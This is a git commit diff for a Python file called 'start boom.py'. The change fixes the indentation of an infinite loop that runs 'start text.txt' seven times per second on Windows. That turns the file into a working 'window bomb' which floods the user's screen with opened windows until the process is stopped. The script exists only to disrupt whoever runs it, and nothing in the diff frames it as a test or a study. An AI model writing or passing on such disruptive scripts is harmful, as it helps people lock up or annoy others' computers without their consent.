9ab4edd94754f0a8a899d9589309a9b47a48040e
godnoob3103 <135569620+godnoob3103@users.noreply.github.com>
2024-06-12 22:01:46 +0700

    Update start boom.py

--- start boom.py
+++ start boom.py
@@ -2,11 +2,11 @@ import os
 import time
 
 while True:
-os.system("start text.txt")
-os.system("start text.txt")
-os.system("start text.txt")
-os.system("start text.txt")
-os.system("start text.txt")
-os.system("start text.txt")
-os.system("start text.txt")
-time.sleep(1) # Shortened delay to 1 second
+    os.system("start text.txt")
+    os.system("start text.txt")
+    os.system("start text.txt")
+    os.system("start text.txt")
+    os.system("start text.txt")
+    os.system("start text.txt")
+    os.system("start text.txt")
+    time.sleep(1) # Shortened delay to 1 second
